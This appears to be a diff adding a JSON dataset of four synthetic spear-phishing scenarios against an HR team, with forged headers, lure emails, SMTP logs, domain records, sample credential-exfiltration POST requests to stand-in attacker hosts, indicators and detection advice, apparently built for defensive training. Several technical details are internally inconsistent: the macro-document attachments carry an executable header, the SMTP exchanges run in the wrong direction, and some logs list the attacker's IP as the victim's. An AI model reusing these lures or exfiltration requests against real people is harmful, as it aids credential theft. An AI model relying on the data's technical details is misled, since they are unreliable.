@@ -1,0 +1,216 @@
+{
+  "samples": [
+    {
+      "scenario": "Spear-phishing email sent to HR personnel impersonating a corporate legal department requesting urgent review of attached NDA documents, containing a malicious Office macro payload designed to harvest employee credentials.",
+      "technical_data": {
+        "email_headers": "Return-Path: <legal-notice@corp-legalservices.com>\r\nReceived: from mail.corp-legalservices.com (mail.corp-legalservices.com [203.0.113.45])\r\n\tby mail.enterprise.com (Postfix) with ESMTPS id 7A12D8F34B\r\n\tfor <hr@enterprise.com>; Fri, 14 Jul 2023 09:17:54 -0400 (EDT)\r\nReceived-SPF: pass (enterprise.com: domain of legal-notice@corp-legalservices.com designates 203.0.113.45 as permitted sender) receiver=enterprise.com; client-ip=203.0.113.45; envelope-from=legal-notice@corp-legalservices.com; helo=mail.corp-legalservices.com;\r\nAuthentication-Results: enterprise.com; dkim=pass header.d=corp-legalservices.com; spf=pass smtp.mailfrom=legal-notice@corp-legalservices.com; dmarc=pass (p=quarantine) header.from=corp-legalservices.com\r\nX-Originating-IP: [203.0.113.45]\r\nX-Mailer: Microsoft Outlook 2019\r\nMessage-ID: <CAJ3+g7Yk@mail.corp-legalservices.com>\r\nDate: Fri, 14 Jul 2023 09:17:52 -0400\r\nFrom: Corporate Legal <legal-notice@corp-legalservices.com>\r\nTo: hr@enterprise.com\r\nSubject: Immediate Action Required: NDA Document Review\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"boundary12345\"",
+        "email_body": "--boundary12345\r\nContent-Type: text/plain; charset=\"UTF-8\"\r\nContent-Transfer-Encoding: 7bit\r\n\r\nDear HR Team,\r\n\r\nPlease review the attached Non-Disclosure Agreement (NDA) documents for upcoming contractors. Your immediate attention is required to ensure compliance.\r\n\r\nRegards,\r\nCorporate Legal Department\r\n--boundary12345\r\nContent-Type: application/vnd.ms-word.document.macroEnabled.12; name=\"NDA_Update.docm\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"NDA_Update.docm\"\r\n\r\nTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAA==\r\n--boundary12345--",
+        "suspicious_url": null,
+        "smtp_transaction_log": "220 mail.corp-legalservices.com ESMTP Postfix\r\nEHLO mail.enterprise.com\r\n250-mail.corp-legalservices.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<legal-notice@corp-legalservices.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<hr@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: Corporate Legal <legal-notice@corp-legalservices.com>\r\nTo: hr@enterprise.com\r\nSubject: Immediate Action Required: NDA Document Review\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"boundary12345\"\r\n\r\n--boundary12345\r\nContent-Type: text/plain; charset=\"UTF-8\"\r\n\r\nDear HR Team,...\r\n--boundary12345--\r\n.\r\n250 2.0.0 Ok: queued as 7A12D8F34B\r\nQUIT\r\n221 2.0.0 Bye",
+        "domain_registration": {
+          "domain": "corp-legalservices.com",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2023-05-10T11:30:00Z",
+          "expiration_date": "2024-05-10T11:30:00Z",
+          "registrant_org": "Privacy Protect, LLC",
+          "registrant_country": "CN"
+        },
+        "dns_records": {
+          "A": [
+            "203.0.113.45"
+          ],
+          "MX": [
+            "mail.corp-legalservices.com"
+          ],
+          "TXT": [
+            "v=spf1 ip4:203.0.113.45 -all"
+          ]
+        },
+        "webserver_access_log": null,
+        "network_packet_capture_snippet": null,
+        "payload_obfuscation": "Malicious macro embedded in the .docm attachment triggers credential harvesting script when enabled by the user; attachment filename mimics typical corporate documentation naming conventions.",
+        "post-exploitation_artifacts": {
+          "stolen_data_exfiltration_http": "POST /submit_credentials HTTP/1.1\r\nHost: attacker-datahub.net\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 128\r\n\r\nusername=hr_user&password=********&employee_list=base64encodeddata==",
+          "hr_system_login_attempts": "Jul 14 10:05:12 hr-system enterprise-sshd[5634]: Accepted password for hr_user from 203.0.113.45 port 53422 ssh2",
+          "mfa_bypass_attempt": "Jul 14 10:05:35 hr-system mfa-service[2134]: Authentication challenge failed for user hr_user from IP 203.0.113.45"
+        }
+      },
+      "indicators": [
+        "Newly registered domain 'corp-legalservices.com' with privacy-protected registrant",
+        "Email with valid SPF, DKIM but originating from an external IP not associated with corporate legal services",
+        "Attachment is a macro-enabled Word document with suspicious base64 payload",
+        "Post-exploitation HTTP POST to attacker-datahub.net containing HR credentials",
+        "SSH login to HR system from suspicious IP shortly after email delivery",
+        "Failed MFA attempts coincide with credential harvesting timeframe"
+      ],
+      "detection_method": "Implement advanced email attachment sandboxing to detect malicious macros; monitor new domain registrations mimicking internal departments; alert on unexpected HR system login attempts from external IPs; inspect outbound HTTP POST traffic for suspicious destinations and payload patterns; enforce strict macro policy and user training on macro-enabled documents.",
+      "relevant_mitre_techniques": [
+        "T1193 - Spearphishing Attachment",
+        "T1566.001 - Spearphishing Attachment",
+        "T1078 - Valid Accounts",
+        "T1110 - Brute Force",
+        "T1056 - Input Capture",
+        "T1041 - Exfiltration Over C2 Channel"
+      ]
+    },
+    {
+      "scenario": "Targeted spear-phishing email sent to HR with a fake corporate benefits survey link designed to harvest login credentials and deploy a web-based keylogger for capturing employee information.",
+      "technical_data": {
+        "email_headers": "Return-Path: <benefits@corp-survey-online.com>\r\nReceived: from mail.corp-survey-online.com (mail.corp-survey-online.com [192.0.2.88])\r\n\tby mail.enterprise.com (Postfix) with ESMTPS id 9D43E7F12C\r\n\tfor <hr@enterprise.com>; Wed, 20 Sep 2023 11:25:34 -0400 (EDT)\r\nReceived-SPF: pass (enterprise.com: domain of benefits@corp-survey-online.com designates 192.0.2.88 as permitted sender) receiver=enterprise.com; client-ip=192.0.2.88; envelope-from=benefits@corp-survey-online.com; helo=mail.corp-survey-online.com;\r\nAuthentication-Results: enterprise.com; dkim=pass header.d=corp-survey-online.com; spf=pass smtp.mailfrom=benefits@corp-survey-online.com; dmarc=pass (p=none) header.from=corp-survey-online.com\r\nX-Originating-IP: [192.0.2.88]\r\nX-Mailer: Mozilla Thunderbird 102.5.0\r\nMessage-ID: <CAW9+u9Jr@mail.corp-survey-online.com>\r\nDate: Wed, 20 Sep 2023 11:25:30 -0400\r\nFrom: Corporate Benefits <benefits@corp-survey-online.com>\r\nTo: hr@enterprise.com\r\nSubject: Participate in Our Updated Employee Benefits Survey\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=\"UTF-8\"",
+        "email_body": "<html><body><p>Dear HR Team,</p><p>We are updating our employee benefits program and require your input. Please complete the survey linked below by <b>September 25, 2023</b>.</p><p><a href=\"https://corp-survey-online.com.secure-feedback-portal.net/survey?token=a1b2c3d4e5\">Access the Benefits Survey</a></p><p>Thank you for your prompt attention.</p><p>Best Regards,<br>Benefits Administration</p></body></html>",
+        "suspicious_url": "https://corp-survey-online.com.secure-feedback-portal.net/survey?token=a1b2c3d4e5",
+        "smtp_transaction_log": "220 mail.corp-survey-online.com ESMTP Postfix\r\nEHLO mail.enterprise.com\r\n250-mail.corp-survey-online.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<benefits@corp-survey-online.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<hr@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: Corporate Benefits <benefits@corp-survey-online.com>\r\nTo: hr@enterprise.com\r\nSubject: Participate in Our Updated Employee Benefits Survey\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=\"UTF-8\"\r\n\r\n<html>...</html>\r\n.\r\n250 2.0.0 Ok: queued as 9D43E7F12C\r\nQUIT\r\n221 2.0.0 Bye",
+        "domain_registration": {
+          "domain": "corp-survey-online.com.secure-feedback-portal.net",
+          "registrar": "NameSilo, LLC",
+          "creation_date": "2023-08-15T08:45:00Z",
+          "expiration_date": "2024-08-15T08:45:00Z",
+          "registrant_org": "WhoisGuard, Inc.",
+          "registrant_country": "BR"
+        },
+        "dns_records": {
+          "A": [
+            "192.0.2.88"
+          ],
+          "MX": [
+            "mail.secure-feedback-portal.net"
+          ],
+          "TXT": [
+            "v=spf1 ip4:192.0.2.88 -all"
+          ]
+        },
+        "webserver_access_log": "192.0.2.88 - - [20/Sep/2023:11:27:01 -0400] \"GET /survey?token=a1b2c3d4e5 HTTP/1.1\" 200 5231 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36\"",
+        "network_packet_capture_snippet": "Frame 5: 624 bytes on wire (4992 bits), 624 bytes captured (4992 bits)\nEthernet II, Src: 00:1a:2b:3c:4d:5e, Dst: 00:0f:34:56:78:9a\nInternet Protocol Version 4, Src: 192.0.2.88, Dst: 192.168.1.102\nTransmission Control Protocol, Src Port: 443, Dst Port: 53456, Seq: 1, Ack: 1, Len: 560\nHypertext Transfer Protocol\n    GET /survey?token=a1b2c3d4e5 HTTP/1.1\r\n    Host: corp-survey-online.com.secure-feedback-portal.net\r\n    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n    Accept: text/html\r\n",
+        "payload_obfuscation": "Use of subdomain 'corp-survey-online.com' prepended to legitimate domain 'secure-feedback-portal.net' to deceive users; URL token parameter mimics secure session tokens to appear legitimate.",
+        "post-exploitation_artifacts": {
+          "stolen_data_exfiltration_http": "POST /keylogger/data HTTP/1.1\r\nHost: attacker-cloudstorage.org\r\nContent-Type: application/json\r\nContent-Length: 198\r\n\r\n{\"username\":\"hr_user\",\"password\":\"Xyz123!\",\"keystroke_data\":\"encrypted_payload_here\"}",
+          "hr_system_login_attempts": "Sep 20 12:05:48 hr-system enterprise-sshd[6721]: Accepted password for hr_user from 192.0.2.88 port 51234 ssh2",
+          "mfa_bypass_attempt": "Sep 20 12:06:10 hr-system mfa-service[1876]: Authentication challenge failed for user hr_user from IP 192.0.2.88"
+        }
+      },
+      "indicators": [
+        "Suspicious domain 'corp-survey-online.com.secure-feedback-portal.net' with recent registration and privacy-protected registrant",
+        "Email passes SPF and DKIM but originates from external IP 192.0.2.88 not linked to corporate survey systems",
+        "Phishing URL uses subdomain trickery to mimic legitimate corporate survey domain",
+        "Webserver logs show HR user accessing phishing survey page from corporate IP",
+        "Exfiltration of captured keystrokes and credentials via POST requests to attacker-cloudstorage.org",
+        "Failed MFA attempts on HR system from suspicious IP address shortly after phishing email received"
+      ],
+      "detection_method": "Deploy email security solutions capable of detecting subdomain impersonation and new domain registrations; monitor outbound HTTP POST requests from HR workstations to unknown external domains; analyze web access logs for access to known phishing URLs; alert on multiple failed MFA challenges from unfamiliar IPs; conduct user awareness training focused on recognizing deceptive survey requests.",
+      "relevant_mitre_techniques": [
+        "T1192 - Spearphishing Link",
+        "T1566.002 - Spearphishing via Link",
+        "T1078 - Valid Accounts",
+        "T1110 - Brute Force",
+        "T1056 - Input Capture",
+        "T1041 - Exfiltration Over C2 Channel"
+      ]
+    },
+    {
+      "scenario": "Spear-phishing email sent to HR personnel impersonating a well-known benefits provider, requesting verification of employee health insurance details via a malicious attachment designed to deploy a credential stealing payload.",
+      "technical_data": {
+        "email_headers": "Return-Path: <benefits@healthsecure-update.com>\r\nReceived: from mail.healthsecure-update.com (mail.healthsecure-update.com [203.0.113.45])\r\n\tby mail.enterprise.com (Postfix) with ESMTPS id 7A32C1D4E5F\r\n\tfor <hr@enterprise.com>; Wed, 12 Apr 2023 14:23:19 -0400 (EDT)\r\nReceived-SPF: pass (enterprise.com: domain of benefits@healthsecure-update.com designates 203.0.113.45 as permitted sender) receiver=enterprise.com; client-ip=203.0.113.45; envelope-from=benefits@healthsecure-update.com; helo=mail.healthsecure-update.com;\r\nAuthentication-Results: enterprise.com; dkim=pass header.d=healthsecure-update.com; spf=pass smtp.mailfrom=benefits@healthsecure-update.com; dmarc=pass (p=quarantine) header.from=healthsecure-update.com\r\nX-Originating-IP: [203.0.113.45]\r\nX-Mailer: Microsoft Outlook 15.0\r\nMessage-ID: <CAJ5+g8Ys@mail.healthsecure-update.com>\r\nDate: Wed, 12 Apr 2023 14:23:17 -0400\r\nFrom: HealthSecure Benefits <benefits@healthsecure-update.com>\r\nTo: hr@enterprise.com\r\nSubject: Immediate Action Required: Verify Employee Health Insurance Data\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_123456_789012345.1681304597\"",
+        "email_body": "------=_Part_123456_789012345.1681304597\r\nContent-Type: text/html; charset=\"UTF-8\"\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n<html><body><p>Dear HR Team,</p><p>We have updated our compliance policies. Please review and verify the attached employee health insurance data file to ensure accuracy.</p><p>Open the attached document <b>Employee_Health_Data_Update.docm</b> and enable macros to proceed.</p><p>Failure to comply within 48 hours may lead to coverage interruptions.</p><p>Regards,<br>HealthSecure Compliance Team</p></body></html>\r\n------=_Part_123456_789012345.1681304597\r\nContent-Type: application/vnd.ms-word.document.macroEnabled.12; name=\"Employee_Health_Data_Update.docm\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Employee_Health_Data_Update.docm\"\r\n\r\nTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAA==\r\n------=_Part_123456_789012345.1681304597--",
+        "suspicious_url": null,
+        "smtp_transaction_log": "220 mail.healthsecure-update.com ESMTP Postfix\r\nEHLO mail.enterprise.com\r\n250-mail.healthsecure-update.com\r\n250-PIPELINING\r\n250-SIZE 20480000\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<benefits@healthsecure-update.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<hr@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: HealthSecure Benefits <benefits@healthsecure-update.com>\r\nTo: hr@enterprise.com\r\nSubject: Immediate Action Required: Verify Employee Health Insurance Data\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_123456_789012345.1681304597\"\r\n\r\nMultipart message with macro-enabled attachment\r\n.\r\n250 2.0.0 Ok: queued as 7A32C1D4E5F\r\nQUIT\r\n221 2.0.0 Bye",
+        "domain_registration": {
+          "domain": "healthsecure-update.com",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2023-02-15T09:45:00Z",
+          "expiration_date": "2024-02-15T09:45:00Z",
+          "registrant_org": "Privacy Protect, LLC",
+          "registrant_country": "CN"
+        },
+        "dns_records": {
+          "A": [
+            "203.0.113.45"
+          ],
+          "MX": [
+            "mail.healthsecure-update.com"
+          ],
+          "TXT": [
+            "v=spf1 ip4:203.0.113.45 -all"
+          ]
+        },
+        "webserver_access_log": null,
+        "network_packet_capture_snippet": null,
+        "payload_obfuscation": "Malicious macro embedded in a .docm attachment which, when enabled, downloads a credential stealer executable from hxxp://malicious-download.healthsecure-update.com/payload.exe",
+        "post-exploitation_artifacts": {
+          "stolen_data_exfiltration_http": "POST /upload HTTP/1.1\r\nHost: attacker-exfil.com\r\nContent-Type: application/octet-stream\r\nContent-Length: 512\r\n\r\n[Encrypted credential data blob]",
+          "hr_system_login_attempts": "Apr 12 16:00:02 hr-system enterprise-sshd[4643]: Accepted password for hr_user from 203.0.113.45 port 55122 ssh2",
+          "mfa_bypass_attempt": "Apr 12 16:00:10 hr-system mfa-service[1102]: Authentication challenge failed for user hr_user from IP 203.0.113.45"
+        }
+      },
+      "indicators": [
+        "Newly registered domain 'healthsecure-update.com' with privacy-protected registrant from China",
+        "Email contains macro-enabled Word document attachment with embedded malicious payload",
+        "SPF and DKIM pass but domain not known to enterprise",
+        "Post-exploitation HTTP POST traffic to attacker-exfil.com carrying encrypted data",
+        "Successful SSH login to HR system from suspicious external IP",
+        "Failed MFA challenge attempts from same external IP"
+      ],
+      "detection_method": "Implement attachment sandboxing to detect macro-enabled documents with suspicious behavior; monitor network traffic for unusual outbound POST requests to unknown domains; apply strict email domain reputation checks especially for new domains; alert on successful HR system logins from external IPs not in whitelist; enforce MFA challenge anomaly detection.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1078 - Valid Accounts",
+        "T1110 - Brute Force",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell"
+      ]
+    },
+    {
+      "scenario": "Targeted spear-phishing email sent to HR team impersonating internal IT department, with a link to a fake password reset portal designed to harvest HR login credentials for further lateral movement.",
+      "technical_data": {
+        "email_headers": "Return-Path: <it-support@enterprise-itservice.com>\r\nReceived: from mail.enterprise-itservice.com (mail.enterprise-itservice.com [192.0.2.78])\r\n\tby mail.enterprise.com (Postfix) with ESMTPS id 9D83B21C5A7\r\n\tfor <hr@enterprise.com>; Mon, 17 Apr 2023 10:12:45 -0400 (EDT)\r\nReceived-SPF: pass (enterprise.com: domain of it-support@enterprise-itservice.com designates 192.0.2.78 as permitted sender) receiver=enterprise.com; client-ip=192.0.2.78; envelope-from=it-support@enterprise-itservice.com; helo=mail.enterprise-itservice.com;\r\nAuthentication-Results: enterprise.com; dkim=pass header.d=enterprise-itservice.com; spf=pass smtp.mailfrom=it-support@enterprise-itservice.com; dmarc=pass (p=none) header.from=enterprise-itservice.com\r\nX-Originating-IP: [192.0.2.78]\r\nX-Mailer: Microsoft Outlook 2019\r\nMessage-ID: <CAK9+v7Uq@mail.enterprise-itservice.com>\r\nDate: Mon, 17 Apr 2023 10:12:43 -0400\r\nFrom: IT Support <it-support@enterprise-itservice.com>\r\nTo: hr@enterprise.com\r\nSubject: Mandatory Password Reset for HR Accounts\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=\"UTF-8\"",
+        "email_body": "<html><body><p>Dear HR Team,</p><p>As part of our ongoing security improvements, all HR personnel must reset their passwords immediately.</p><p>Please <a href=\"https://enterprise-itservice.com.reset-password-hr.com/login?user=hr\">click here to access the password reset portal</a> and follow the instructions.</p><p>This action is mandatory to maintain access to HR systems.</p><p>Thank you,<br>IT Support Team</p></body></html>",
+        "suspicious_url": "https://enterprise-itservice.com.reset-password-hr.com/login?user=hr",
+        "smtp_transaction_log": "220 mail.enterprise-itservice.com ESMTP Postfix\r\nEHLO mail.enterprise.com\r\n250-mail.enterprise-itservice.com\r\n250-PIPELINING\r\n250-SIZE 5120000\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<it-support@enterprise-itservice.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<hr@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: IT Support <it-support@enterprise-itservice.com>\r\nTo: hr@enterprise.com\r\nSubject: Mandatory Password Reset for HR Accounts\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=\"UTF-8\"\r\n\r\n<html>...</html>\r\n.\r\n250 2.0.0 Ok: queued as 9D83B21C5A7\r\nQUIT\r\n221 2.0.0 Bye",
+        "domain_registration": {
+          "domain": "enterprise-itservice.com.reset-password-hr.com",
+          "registrar": "Dynadot, LLC",
+          "creation_date": "2023-04-05T21:30:00Z",
+          "expiration_date": "2024-04-05T21:30:00Z",
+          "registrant_org": "WhoisGuard, Inc.",
+          "registrant_country": "BR"
+        },
+        "dns_records": {
+          "A": [
+            "192.0.2.78"
+          ],
+          "MX": [
+            "mail.reset-password-hr.com"
+          ],
+          "TXT": [
+            "v=spf1 ip4:192.0.2.78 -all"
+          ]
+        },
+        "webserver_access_log": "192.0.2.78 - - [17/Apr/2023:10:14:02 -0400] \"GET /login?user=hr HTTP/1.1\" 200 4130 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/112.0.0.0 Safari/537.36\"",
+        "network_packet_capture_snippet": "Frame 12: 600 bytes on wire (4800 bits), 600 bytes captured (4800 bits)\nEthernet II, Src: 00:0a:95:9d:68:16, Dst: 00:50:56:c0:00:08\nInternet Protocol Version 4, Src: 192.0.2.78, Dst: 192.168.10.55\nTransmission Control Protocol, Src Port: 443, Dst Port: 50433, Seq: 1, Ack: 1, Len: 546\nHypertext Transfer Protocol\n    GET /login?user=hr HTTP/1.1\r\n    Host: enterprise-itservice.com.reset-password-hr.com\r\n    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n    Accept: text/html\r\n",
+        "payload_obfuscation": "URL uses subdomain 'enterprise-itservice.com' prepended to legitimate-looking domain 'reset-password-hr.com' to trick recipients; URL parameters mimic legitimate session tokens but lead to credential harvesting page.",
+        "post-exploitation_artifacts": {
+          "stolen_data_exfiltration_http": "POST /collect HTTP/1.1\r\nHost: attacker-collect.biz\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 128\r\n\r\nusername=hr_user&password=Pa$$w0rd123&token=abc123xyz",
+          "hr_system_login_attempts": "Apr 17 11:00:15 hr-system enterprise-sshd[4789]: Accepted password for hr_user from 192.0.2.78 port 60211 ssh2",
+          "mfa_bypass_attempt": "Apr 17 11:00:25 hr-system mfa-service[1205]: Authentication challenge failed for user hr_user from IP 192.0.2.78"
+        }
+      },
+      "indicators": [
+        "Suspicious domain 'enterprise-itservice.com.reset-password-hr.com' with recent registration and privacy guard from Brazil",
+        "Email passes SPF and DKIM but originates from external IP 192.0.2.78",
+        "Phishing URL uses subdomain impersonation techniques to mimic IT support portal",
+        "Webserver logs show HR user agent accessing phishing login page immediately after email delivery",
+        "Exfiltration of HR credentials via HTTP POST to attacker-collect.biz",
+        "Successful HR system login and failed MFA attempts from suspicious external IP"
+      ],
+      "detection_method": "Use domain similarity and registration date heuristics to block newly created deceptive domains; scan URLs in emails for subdomain impersonation patterns; monitor HR system login activity for unusual IP addresses; inspect outbound HTTP POST requests for credential exfiltration patterns; enforce anomaly detection on MFA failure rates.",
+      "relevant_mitre_techniques": [
+        "T1192 - Spearphishing Link",
+        "T1566.002 - Spearphishing via Link",
+        "T1078 - Valid Accounts",
+        "T1110 - Brute Force",
+        "T1537 - Transfer Data to Cloud Account",
+        "T1056 - Input Capture"
+      ]
+    }
+  ]
+}
